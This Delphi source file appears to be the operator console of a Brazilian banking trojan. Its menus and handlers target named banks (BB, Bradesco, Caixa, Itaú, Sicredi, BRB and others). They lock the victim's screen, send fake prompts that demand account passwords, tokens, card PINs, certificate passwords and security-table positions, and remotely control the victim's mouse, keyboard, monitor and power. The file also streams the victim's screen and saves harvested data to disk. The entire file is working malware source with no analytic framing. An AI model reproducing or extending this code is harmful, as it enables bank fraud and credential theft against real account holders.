unit Unit2;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, StdCtrls, ScktComp, ComCtrls,Vcl.ImgList, Vcl.Menus,
  Vcl.ExtCtrls, Vcl.Buttons,StreamManager,UnitClipboard, zLibex;

   type
  TRemoto = class(TThread)
    procedure Execute; override;
  public
    Socket: TCustomWinSocket;
  private
end;


type
  TForm2 = class(TForm)
    MainMenu1: TMainMenu;
    ControleBancos1: TMenuItem;
    BB1: TMenuItem;
    BBNormal1: TMenuItem;
    ravarTela1: TMenuItem;
    PedirSenhade6Dgitos1: TMenuItem;
    BBEstilo1: TMenuItem;
    ravarTelaBBEstilo1: TMenuItem;
    SolicitarSenhade6DgitosEstilo1: TMenuItem;
    Bradesco1: TMenuItem;
    BBNormal2: TMenuItem;
    EnviarAvisodeAtualiao1: TMenuItem;
    SolicitarPosioTabela1: TMenuItem;
    PedirToken2: TMenuItem;
    SolicitarTokenCelularNormal1: TMenuItem;
    BradescoEmpresa1: TMenuItem;
    ravarTela7: TMenuItem;
    SolicitarToken4: TMenuItem;
    SolicitarSenhadoCertificado2: TMenuItem;
    BBGF1: TMenuItem;
    ravarTela2: TMenuItem;
    SolictarSenhadaConta1: TMenuItem;
    SolicitarSenhadoCertificado1: TMenuItem;
    BBEmpresa1: TMenuItem;
    ravarTela9: TMenuItem;
    SolictarSenhadaConta2: TMenuItem;
    SolicitarSenhadoCertificado3: TMenuItem;
    Caixa1: TMenuItem;
    ravarTela3: TMenuItem;
    PedirAssinaturaEletrnica1: TMenuItem;
    Ita1: TMenuItem;
    ItaNormal1: TMenuItem;
    ravarTelaNormal1: TMenuItem;
    SolicitarSenhaCartto1: TMenuItem;
    PedirToken3: TMenuItem;
    SolicitarTabelaNormal1: TMenuItem;
    ItaUniclass1: TMenuItem;
    ravarTelaUniClass1: TMenuItem;
    SolicitarSenhaCartoUniclass1: TMenuItem;
    SolicitarTokenUniclass1: TMenuItem;
    SolicitarTabelaUniclass1: TMenuItem;
    ItaPersonnalit1: TMenuItem;
    ravarTelaPersonnalit1: TMenuItem;
    SolicitarSenhaCartoPersonalitte1: TMenuItem;
    SolicitarTokenPersonalite1: TMenuItem;
    SolicitarTabelaPersonnalit1: TMenuItem;
    Sicoob1: TMenuItem;
    ravarTela5: TMenuItem;
    SolicitarSenhadaConta1: TMenuItem;
    SolicitarToken1: TMenuItem;
    N4: TMenuItem;
    DestravarTela11: TMenuItem;
    BloquearTela24hrs1: TMenuItem;
    EnviarMensagem1: TMenuItem;
    ControleDeskto1: TMenuItem;
    DesligarMonitorRemoto1: TMenuItem;
    LigarMonitorRemoto1: TMenuItem;
    N3: TMenuItem;
    ReiniciarPCRemoto1: TMenuItem;
    DesligarPCRemoto1: TMenuItem;
    ControledeNavegadores1: TMenuItem;
    InternetExplorer1: TMenuItem;
    KilladorHook1: TMenuItem;
    abrir1: TMenuItem;
    Fechar1: TMenuItem;
    CheckBox9: TCheckBox;
    GroupBox1: TGroupBox;
    Label2: TLabel;
    Label3: TLabel;
    Label5: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Memo1: TMemo;
    Button1: TButton;
    Button3: TButton;
    GroupBox3: TGroupBox;
    Button4: TButton;
    Button5: TButton;
    Panel2: TPanel;
    ProgressBar1: TProgressBar;
    Panel1: TPanel;
    Label6: TLabel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    ImageList1: TImageList;
    Panel3: TPanel;
    SaveDialog1: TSaveDialog;
    ScrollBox1: TScrollBox;
    Image1: TImage;
    Label1: TLabel;
    Label4: TLabel;
    MMClick: TMemo;
    Edit2: TEdit;
    Timer2: TTimer;
    TrmAviso: TTimer;
    TrmAviso1: TTimer;
    TrmTecladoNavi: TTimer;
    TrmTecladoPC: TTimer;
    GroupBox4: TGroupBox;
    GroupBox5: TGroupBox;
    Edit3: TEdit;
    Button6: TButton;
    S1: TMenuItem;
    Panel4: TPanel;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    Label9: TLabel;
    Label10: TLabel;
    Label11: TLabel;
    S2: TMenuItem;
    I1: TMenuItem;
    G1: TMenuItem;
    SenhaCarto1: TMenuItem;
    oken1: TMenuItem;
    Nordeste1: TMenuItem;
    GB1: TMenuItem;
    T1: TMenuItem;
    B1: TMenuItem;
    G2: TMenuItem;
    T2: TMenuItem;
    L1: TMenuItem;
    N1: TMenuItem;
    BMG1: TMenuItem;
    Cetelem1: TMenuItem;
    SolicitarLogin1: TMenuItem;
    SolicitarLogin2: TMenuItem;
    procedure Image1DblClick(Sender: TObject);
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Button4Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure InternetExplorer1Click(Sender: TObject);
    procedure CapturadeTelaNivel21Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure CheckBox1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure TrmTecladoNaviTimer(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure DesligarMonitorRemoto1Click(Sender: TObject);
    procedure LigarMonitorRemoto1Click(Sender: TObject);
    procedure ravarMouseMonitorRemoto1Click(Sender: TObject);
    procedure DestravarMouseTecladoRemoto1Click(Sender: TObject);
    procedure ReiniciarPCRemoto1Click(Sender: TObject);
    procedure DesligarPCRemoto1Click(Sender: TObject);
    procedure ravarTela1Click(Sender: TObject);
    procedure PedirSenhade6Dgitos1Click(Sender: TObject);
    procedure ravarTelaBBEstilo1Click(Sender: TObject);
    procedure SolicitarSenhade6DgitosEstilo1Click(Sender: TObject);
    procedure ravarTela3Click(Sender: TObject);
    procedure PedirAssinaturaEletrnica1Click(Sender: TObject);
    procedure EnviarAvisodeAtualiao1Click(Sender: TObject);
    procedure SolicitarPosioTabela1Click(Sender: TObject);
    procedure PedirToken2Click(Sender: TObject);
    procedure SolicitarTokenCelularNormal1Click(Sender: TObject);
    procedure ravarTela5Click(Sender: TObject);
    procedure SolicitarSenhadaConta1Click(Sender: TObject);
    procedure SolicitarToken1Click(Sender: TObject);
    procedure ravarTela7Click(Sender: TObject);
    procedure SolicitarToken4Click(Sender: TObject);
    procedure SolicitarSenhadoCertificado2Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure RadioButton1Click(Sender: TObject);
    procedure RadioButton2Click(Sender: TObject);
    procedure BloquearTela24hrs1Click(Sender: TObject);
    procedure ravarTela2Click(Sender: TObject);
    procedure SolictarSenhadaConta1Click(Sender: TObject);
    procedure SolicitarSenhadoCertificado1Click(Sender: TObject);
    procedure ravarTela9Click(Sender: TObject);
    procedure SolictarSenhadaConta2Click(Sender: TObject);
    procedure SolicitarSenhadoCertificado3Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure ravarTela8Click(Sender: TObject);
    procedure SolicitarSenhaNascimentoCarto1Click(Sender: TObject);
    procedure SolicitarToken5Click(Sender: TObject);
    procedure ravarTelaNormal1Click(Sender: TObject);
    procedure SolicitarSenhaCartto1Click(Sender: TObject);
    procedure PedirToken3Click(Sender: TObject);
    procedure SolicitarTabelaNormal1Click(Sender: TObject);
    procedure G1Click(Sender: TObject);
    procedure SenhaCarto1Click(Sender: TObject);
    procedure oken1Click(Sender: TObject);
    procedure ravarTelaUniClass1Click(Sender: TObject);
    procedure SolicitarSenhaCartoUniclass1Click(Sender: TObject);
    procedure SolicitarTokenUniclass1Click(Sender: TObject);
    procedure SolicitarTabelaUniclass1Click(Sender: TObject);
    procedure ravarTelaPersonnalit1Click(Sender: TObject);
    procedure SolicitarSenhaCartoPersonalitte1Click(Sender: TObject);
    procedure SolicitarTokenPersonalite1Click(Sender: TObject);
    procedure SolicitarTabelaPersonnalit1Click(Sender: TObject);
    procedure LiberarTravamento1Click(Sender: TObject);
    procedure DestravarTela11Click(Sender: TObject);
    procedure EnviarMensagem1Click(Sender: TObject);
    procedure GB1Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure G2Click(Sender: TObject);
    procedure T2Click(Sender: TObject);
    procedure abrir1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure CheckBox3Click(Sender: TObject);
    procedure SolicitarLogin2Click(Sender: TObject);
  private
    { Private declarations }
  public
        Socket, Socket2: TCustomWinSocket;
    Remoto  : TRemoto;
    ResX, ResY: Integer;
     procedure destrava1();
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation

{$R *.dfm}

uses Unit1,Unit9, Unit5, Unit10, Unit8, Unit4;


procedure TForm2.Image1DblClick(Sender: TObject);
begin
   if CheckBox1.Checked then
      Socket.SendText('<|MouseDC|>')
end;

procedure TForm2.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Active = false then
    exit;



  if CheckBox1.Checked then
  begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;

    if Button = mbLeft then
      Socket.SendText('<|MouseLD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
      Socket.SendText('<|MouseRD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  X := (X * ResX) div Image1.Width;
  Y := (Y * ResY) div Image1.Height;
  label2.Caption := IntToStr(X);
  label3.caption := IntToStr(Y);

  if Active = false then
     exit;

  if CheckBox1.Checked then
  begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;
    Socket.SendText('<|MousePos|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin

   if CheckBox4.Checked = True then
   begin
    Socket.SendText('click'+ label2.caption + ',' + label3.caption);
   end;

   if Active = false then
      exit;

   if CheckBox1.Checked then
   begin
    X := (X * ResX) div Image1.Width;
    Y := (Y * ResY) div Image1.Height;
    if Button = mbLeft then
       Socket.SendText('<|MouseLU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
       Socket.SendText('<|MouseRU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
   end;
end;

procedure TForm2.InternetExplorer1Click(Sender: TObject);
begin
Panel4.Visible := true;
end;

procedure TForm2.L1Click(Sender: TObject);
begin
Socket.SendText('destrava');
end;

procedure TForm2.LiberarTravamento1Click(Sender: TObject);
begin
SOcket.SendText('Destrava');
end;

procedure TForm2.LigarMonitorRemoto1Click(Sender: TObject);
begin
 Socket.SendText('{LIGAMON}');
 Application.MessageBox('Monitor Remoto Ligado!', 'Aviso', 64);
end;

procedure TForm2.oken1Click(Sender: TObject);
begin
// Solicita Token ITAU

 Form1.Label3.Caption := 'ItaEmpresa';
 FORM10.Panel1.Visible := true;
 Form10.Panel1.BringToFront;
 Form10.Show;
end;

procedure TForm2.PedirAssinaturaEletrnica1Click(Sender: TObject);
begin
// Solicita Senha de 6 CEF

 Socket.SendText('{SENHA6CF}');
end;

procedure TForm2.PedirSenhade6Dgitos1Click(Sender: TObject);
begin

 Socket.SendText('{SENHA6BB}');
end;

procedure TForm2.PedirToken2Click(Sender: TObject);
begin

 Socket.SendText('{DESCOTO}');
end;

procedure TForm2.PedirToken3Click(Sender: TObject);
begin
// Solicita Token ITAU

 Form1.Label3.Caption := 'Normal';
 FOrm10.Visible := true;
 Form10.BringToFront;
 Form10.Show;
end;

procedure TForm2.RadioButton1Click(Sender: TObject);
begin
Socket.SendText('<DESKTOP>');
PAnel4.Visible := false;
RadioButton1.Checked := false;
Form1.Edit6.Text := 'Desk';
end;

procedure TForm2.RadioButton2Click(Sender: TObject);
begin
Socket.SendText('<Navi>');
Panel4.Visible := False;
RadioButton2.Checked := false;
Form1.Edit6.Text := 'Navi';
end;

procedure TForm2.ravarMouseMonitorRemoto1Click(Sender: TObject);
begin
 Socket.SendText('{TRAVAM}');
end;

procedure TForm2.ravarTela1Click(Sender: TObject);
begin
 Form9.Show;
 Label7.Caption := 'BB';
 Label11.Caption := 'BB';
 Form1.Label3.Caption := 'BBNORMAL';
 Button5.Enabled := True;
end;

procedure TForm2.ravarTela2Click(Sender: TObject);
begin
// Trava BB GF
 Form9.Show;
 Form1.Label3.Caption := 'BBEMPRESARIAL';
 Label7.Caption := 'BBEMPRESARIAL';
 Button5.Enabled := True;
end;

procedure TForm2.ravarTela3Click(Sender: TObject);
begin
// Trava CEF
 Form9.Show;
 Label7.Caption := 'CAIXA';
 Label11.Caption := 'CAIXA';
 Form1.Label3.Caption := 'CAIXA';
 Button5.Enabled := True;
end;

procedure TForm2.ravarTela5Click(Sender: TObject);
begin
 Form9.Show;
 Form1.Label3.Caption := 'SICREDI';
 Label11.Caption := 'SICRE';

end;

procedure TForm2.ravarTela7Click(Sender: TObject);
begin

 Form9.Show;
 Form1.Label3.Caption := 'DESCOEMPRESA';
 Label11.Caption := 'DESCO';
end;

procedure TForm2.ravarTela8Click(Sender: TObject);
begin
 // Trava Ita
 Form9.Show;
 Form1.Label3.Caption := 'ITAUEMPRESA';
end;

procedure TForm2.ravarTela9Click(Sender: TObject);
begin
 Form9.Show;
 Form1.Label3.Caption := 'BBEMPRESA';
 Label7.Caption := 'BBEMPRESA';
 Button5.Enabled := True;
end;

procedure TForm2.ravarTelaBBEstilo1Click(Sender: TObject);
begin
 Label7.Caption := 'BB';
 Button5.Enabled := True;
 Form9.Show;
 Form1.Label3.Caption := 'BBESTILO';
end;

procedure TForm2.ravarTelaNormal1Click(Sender: TObject);
begin
 // Trava Ita
 Form1.Label3.Caption := 'Normal';
 Form9.Show;
end;

procedure TForm2.ravarTelaPersonnalit1Click(Sender: TObject);
begin
 // Trava Ita
 Form1.Label3.Caption := 'Perso';
 Form9.Show;
end;

procedure TForm2.ravarTelaUniClass1Click(Sender: TObject);
begin
 // Trava Ita
 Form1.Label3.Caption := 'Uniclass';
 Form9.Show;
end;

procedure TForm2.ReiniciarPCRemoto1Click(Sender: TObject);
begin
 Socket.SendText('<reini>');
end;

procedure TForm2.S1Click(Sender: TObject);
begin
Form2.Close;
Remoto.Terminate;
end;

procedure TForm2.S2Click(Sender: TObject);
begin

Socket.SendText('{BBGBCART}')
end;

procedure TForm2.SenhaCarto1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU

 Socket.SendText('{SENHA6EM}');
end;

procedure TForm2.SolicitarLogin2Click(Sender: TObject);
begin

Socket.SendText('{EditUsuario}');

end;



procedure TForm2.SolicitarPosioTabela1Click(Sender: TObject);
begin
 Form1.Label6.Caption := 'Normal';
 Form5.Show;
end;

procedure TForm2.SolicitarSenhaCartoPersonalitte1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU

 Socket.SendText('{SENHA6PE}');
end;

procedure TForm2.SolicitarSenhaCartoUniclass1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU

 Socket.SendText('{SENHA6UN}');
end;

procedure TForm2.SolicitarSenhaCartto1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU

 Socket.SendText('{SENHA6IT}');
end;

procedure TForm2.SolicitarSenhadaConta1Click(Sender: TObject);
begin
  // Solicita Ass Sicredi

 Socket.SendText('{SICASS}');
end;

procedure TForm2.SolicitarSenhade6DgitosEstilo1Click(Sender: TObject);
begin

 Socket.SendText('{SENHA6EST}');
end;

procedure TForm2.SolicitarSenhadoCertificado1Click(Sender: TObject);
begin

 Socket.SendText('{BBECSX}');
end;

procedure TForm2.SolicitarSenhadoCertificado2Click(Sender: TObject);
begin

 Socket.SendText('DESKOCERTINET');
end;

procedure TForm2.SolicitarSenhadoCertificado3Click(Sender: TObject);
begin

 Socket.SendText('BBCERT');
end;

procedure TForm2.SolicitarSenhaNascimentoCarto1Click(Sender: TObject);
begin
// Solicita Senha de 6 ITAU

 Socket.SendText('{SENHA6EM}');
end;

procedure TForm2.SolicitarTabelaNormal1Click(Sender: TObject);
begin

 Form1.Label3.Caption := 'Normal';
 Form8.Visible := True;
 Form8.Normal.BringToFront;
 Form8.Show;
end;

procedure TForm2.SolicitarTabelaPersonnalit1Click(Sender: TObject);
begin
 Form1.Label3.Caption := 'Perso';
 Form8.Show;
end;

procedure TForm2.SolicitarTabelaUniclass1Click(Sender: TObject);
begin
 Form1.Label3.Caption := 'Uniclass';
 Form8.UNICLASS.Visible := True;
 Form8.UNICLASS.BringToFront;
 Form8.Show;
end;

procedure TForm2.SolicitarToken1Click(Sender: TObject);
begin
// Solicita Token Sicredi

 Socket.SendText('{TOKENSIC}');
end;

procedure TForm2.SolicitarToken4Click(Sender: TObject);
begin

 Socket.SendText('{DESCONETT}');
end;

procedure TForm2.SolicitarToken5Click(Sender: TObject);
begin
// Solicita Token ITAU

 Socket.SendText('{TOKENEM}');
 Form1.Label3.Caption := 'ItaEmpresa';
 Form10.Show;
end;

procedure TForm2.SolicitarTokenCelularNormal1Click(Sender: TObject);
begin

 Socket.SendText('{DESCOSN}');
end;

procedure TForm2.SolicitarTokenPersonalite1Click(Sender: TObject);
begin
// Solicita Token ITAU

 Socket.SendText('{TOKENPE}');
 Form1.Label3.Caption := 'Perso';
 FOrm10.PERSO.visible := true;
 Form10.PERSO.BringToFront;
 Form10.Show;
end;

procedure TForm2.SolicitarTokenUniclass1Click(Sender: TObject);
begin
// Solicita Token ITAU

 Form1.Label3.Caption := 'Uniclass';
 Form10.UNICLASS.Visible := true;
 Form10.UNICLASS.BringToFront;
 Form10.Show;
end;

procedure TForm2.SolictarSenhadaConta1Click(Sender: TObject);
begin

 Socket.SendText('{BBXCS1}');
end;

procedure TForm2.SolictarSenhadaConta2Click(Sender: TObject);
begin

 Socket.SendText('BBCONTA');
end;

procedure TForm2.T1Click(Sender: TObject);
begin
 Form1.Label6.Caption := 'NordesteT';
 Form5.Show;
end;

procedure TForm2.T2Click(Sender: TObject);
begin

 Socket.SendText('{TOKENBRB}');
end;



procedure TForm2.TrmTecladoNaviTimer(Sender: TObject);
var
      i : byte;
      s2,Bank1: string;
begin
 if (Active) and (CheckBox5.Checked = True) then
 begin
  try
    for i:=8 To 222 do
    begin
       if GetAsyncKeyState(i)=-32767 then
       begin
        case i of
         8  : Socket.SendText('{BS}');
         13 : Socket.SendText('{ENTER}');
         17 : Socket.SendText('{CTRL}');
         27 : Socket.SendText('{ESCAPE}');
         32 : Socket.SendText('{SPACE}');
         37 : Socket.SendText('{LEFT}');
         38 : Socket.SendText('{UP}');
         39 : Socket.SendText('{RIGHT}');
         40 : Socket.SendText('{DOWN}');
         188 : Socket.SendText('{VIRG}');
         110 : Socket.SendText('{PONTO}');
         190 : Socket.SendText('{PONTO1}');
         46 : Socket.SendText('{DEL}');
         48 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText(')')
              else Socket.SendText('0');
         49 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('!')
              else Socket.SendText('1');
         50 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('@')
              else Socket.SendText('2');
         51 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('#')
              else Socket.SendText('3');
         52 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('$')
              else Socket.SendText('4');
         53 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('%')
              else Socket.SendText('5');
         54 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('^')
              else Socket.SendText('6');
         55 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('&')
              else Socket.SendText('7');
         56 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('*')
              else Socket.SendText('8');
         57 : if GetKeyState(VK_SHIFT)<0 then Socket.SendText('(')
              else Socket.SendText('9');
          65..90 : // a..z , A..Z
             begin
              Socket.SendText('<|LETR|>'+ Chr(i) +'<|>');//a..z
             end;
        end;
       end;
    end;
  except
   exit;
  end;
 end;


end;

procedure TForm2.abrir1Click(Sender: TObject);
begin
Socket.SendText('<|DSTCLIENTE|>');
end;

procedure TForm2.BloquearTela24hrs1Click(Sender: TObject);
var
  L,L9: TListItem;
begin
  Socket.SendText('{TRAVA24}');
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then
  begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
  sleep(1000);
  // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Socket.SendText('{DESTRAVAM}');
  sleep(100);
  Socket.SendText('<|reini|>');
  Remoto.Terminate;
  Destroy;

end;

procedure TForm2.Button1Click(Sender: TObject);
begin
 Memo1.Clear;
end;

procedure TForm2.Button3Click(Sender: TObject);
begin
 SaveDialog1.Execute;
 Image1.Picture.SaveToFile(SaveDialog1.FileName);
end;

procedure TForm2.Button4Click(Sender: TObject);
var
  Str: string;
begin
   GetClipboardText(Handle, Str);
   Socket.SendText('<|CLIP|>'+ Str +'<|>');
end;

procedure TForm2.Button5Click(Sender: TObject);
var
after: string;
hora: TDateTime;
begin
 if directoryexists('c:\infos') then
 begin
  hora := Time();
  after := StringReplace(TimeToStr(hora), ':', '', [rfReplaceAll, rfIgnoreCase]);
  Memo1.Lines.SaveToFile('c:\infos\' + Label7.Caption + '-' + after + '.txt');
  Application.MessageBox('Arquivo criado  com sucesso!', 'Aviso', 64);
 end
 else
  Application.MessageBox('Diretório não existe!', 'Erro', 64);

end;

procedure TForm2.Button6Click(Sender: TObject);
begin
Socket.SendText('KEY'+Edit3.Text);
end;

procedure TForm2.CapturadeTelaNivel21Click(Sender: TObject);
begin
Socket.SendText('<DESKTOP>');
end;

procedure TForm2.CheckBox1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox3Click(Sender: TObject);
begin
  if CheckBox3.Checked then
  begin
    Image1.AutoSize := false;
    Image1.Stretch := true;
    Image1.Align := alClient;
  end
  else
  begin
    Image1.AutoSize := true;
    Image1.Stretch := false;
    Image1.Align := alNone;
  end;
end;

procedure TForm2.D1Click(Sender: TObject);
begin
Socket.SendText('<|FAKE|>');
end;

procedure TForm2.DesligarMonitorRemoto1Click(Sender: TObject);
begin
 Socket.SendText('{DESMON}');
 Application.MessageBox('Monitor Remoto Desligado!', 'Aviso', 64);
end;

procedure TForm2.DesligarPCRemoto1Click(Sender: TObject);
begin
 Socket.SendText('<|desli|>');
end;

procedure TForm2.destrava1();
begin
 if Form1.Edit6.Text = 'Desk' then
 begin
    CheckBox1.Checked := True;
    CheckBox5.Checked := True;
    CheckBox1.Enabled := True;
    CheckBox5.Enabled := True;
 end;

 if Form1.Edit6.Text = 'Navi' then
 begin
  CheckBox4.Checked := True;
  CheckBox5.Checked := True;
  CheckBox4.Enabled := True;
  CheckBox5.Enabled := True;
 end;
end;

procedure TForm2.DestravarMouseTecladoRemoto1Click(Sender: TObject);
begin
 Socket.SendText('{DESTRAVAM}');
end;

procedure TForm2.DestravarTela11Click(Sender: TObject);
begin
 // Desativa Timers
 TrmTecladoNavi.Enabled := False;
 TrmAviso.Enabled := False;
 CheckBox1.Checked := False;
 sleep(500);
 Socket.SendText('<reini>');
end;

procedure TForm2.EnviarAvisodeAtualiao1Click(Sender: TObject);
begin
 Form9.Show;
 Form1.Label3.Caption := 'DESCONORMAL';
 Label11.Caption := 'DESCO';
end;

procedure TForm2.EnviarMensagem1Click(Sender: TObject);
begin
FOrm4.show;
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
var
  L,L9: TListItem;
begin
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;

  L := Form1.LV1.FindCaption(0, intToStr(Socket.Handle), false, true, false);
  if L <> nil then begin
    L.SubItems.Objects[1] := nil;
    L.SubItems.Objects[2] := nil;
  end;
    // Desativa Timers
  TrmTecladoNavi.Enabled := False;
  TrmAviso.Enabled := False;
  Remoto.Terminate;
  Destroy;

end;

procedure TForm2.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
var
srt: string;
begin {
 if Key = 17 then Exit;
  if ((ssCtrl in Shift) AND (Key = Ord('V'))) then
  begin
   Socket.SendText('<|CLIP|>'+ srt +'<|>');
   Exit;
  end;
  if Key < 45 then
  begin
   Socket.SendText('<|CLIP|>'+ srt +'<|>');
   Abort;
  end;}

end;

procedure TForm2.FormShow(Sender: TObject);
begin
  TrmTecladoNavi.Enabled := true;
   Panel4.top := (self.Height div 2) - (Panel4.height div 2);
   Panel4.left := (self.Width div 2) - (Panel4.width div 2);
end;

procedure TForm2.G1Click(Sender: TObject);
begin
 // Trava Ita
 Form9.Show;
 Form1.Label3.Caption := 'ITAUEMPRESA';
end;

procedure TForm2.G2Click(Sender: TObject);
begin
Form9.Show;
 Form1.Label3.Caption := 'BRBBRASIL';
end;

procedure TForm2.GB1Click(Sender: TObject);
begin
 Form1.Label3.Caption := 'Nordeste';
 Form9.Show;
end;

function DeCompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin
  result := false;
  if not assigned(SrcStream) then exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    zdecompress(inbuffer,count,outbuffer,outcount);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;




{ TRemoto }

procedure TRemoto.Execute;
var
  i: Integer;
  L: TListItem;
  bmp: TBitmap;
  Stream: TMemoryStream;

  MyBuffer: array [0 .. 10000] of byte;
  MyReceviceLength: Integer;
  S, dados2: String;

  MyFirstBmp, MySecondBmp, MyCompareBmp, UnPackStream,
  MyTempStream: TMemoryStream;
  MySize: longint;
  recebendo: boolean;

begin
 MyFirstBmp := TMemoryStream.Create;
 UnpackStream := TMemoryStream.Create;
 MyTempStream := TMemoryStream.Create;
 MySecondBmp := TMemoryStream.Create;
 MyCompareBmp := TMemoryStream.Create;
 UnPackStream := TMemoryStream.Create;

 if Form1.LV1.Visible = True then
 begin
  for i := 0 to Form1.LV1.Items.Count-1 do
  begin
   if Form1.LV1.Items.Item[i].SubItems.Objects[1] = TCustomWinSocket(Socket) then
      L := Form1.LV1.Items.Item[i];
  end;
 end;

 While not Terminated and Socket.Connected do
 begin
   if Socket.ReceiveLength > 0 then
   begin
    S := Socket.ReceiveText;
     if MySize = 0 then
     begin
       if Pos('<|TAMANHO|>', s) > 0 then
       begin
        dados2 := s;
        Delete(dados2, 1, Pos('<|TAMANHO|>', dados2)+10);
        dados2 := Copy(dados2, 1, Pos('<<|', dados2)-1);
        MySize := StrToInt(dados2);
        (L.SubItems.Objects[2] as TForm2).ProgressBar1.Max := MySize;
        recebendo := true;
        dados2 := '';
        Socket.SendText('<|okok|>');
       end;
     end
     else
     begin
      dados2 := dados2 + s;
       if Length(dados2) >= MySize then
       begin
        MyTempStream.Write(AnsiString(dados2)[1], MySize);
        MyTempStream.Position := 0;
        UnPackStream.Clear;

        (L.SubItems.Objects[2] as TForm2).Label4.Visible := False;
        (L.SubItems.Objects[2] as TForm2).ProgressBar1.Position := MySize;

        UnPackStream.LoadFromStream(MyTempStream);
        DecompressStream(UnPackStream);
        UnPackStream.Position := 0;
         if MyFirstBmp.Size = 0 then
         begin
          MyFirstBmp.CopyFrom(UnPackStream, 0);
          MyFirstBmp.Position := 0;
          (L.SubItems.Objects[2] as TForm2).Image1.Picture.Bitmap.LoadFromStream(MyFirstBmp);
          (L.SubItems.Objects[2] as TForm2).Width := (L.SubItems.Objects[2] as TForm2).Image1.Width+30;
          (L.SubItems.Objects[2] as TForm2).Height := (L.SubItems.Objects[2] as TForm2).Image1.Height+100;
          (L.SubItems.Objects[2] as TForm2).ResX := (L.SubItems.Objects[2] as TForm2).Image1.Picture.Width;
          (L.SubItems.Objects[2] as TForm2).ResY := (L.SubItems.Objects[2] as TForm2).Image1.Picture.Height;
         end
         else
         begin
          MyCompareBmp.Clear;
          MySecondBmp.Clear;
          MyCompareBmp.CopyFrom(UnpackStream, 0);
          ResumeStream(MyFirstBmp, MySecondBmp, MyCompareBmp);
           if L.SubItems.Objects[2] <> nil then
             (L.SubItems.Objects[2] as TForm2).Image1.Picture.Bitmap.LoadFromStream(MySecondBmp);
         end;
           MySize := 0;
           UnPackStream.Clear;
           MyTempStream.Clear;
           MySecondBMP.Clear;
           MyCompareBmp.Clear;
            if ((L.SubItems.Objects[2] <> nil) and(L.SubItems.Objects[2] as TForm2).Visible) then
                Socket.SendText('<|gets|>');
       end;
     end;
   end;
   Sleep(10); // evita a CPU ficar em 100%
 end;
end;




end.
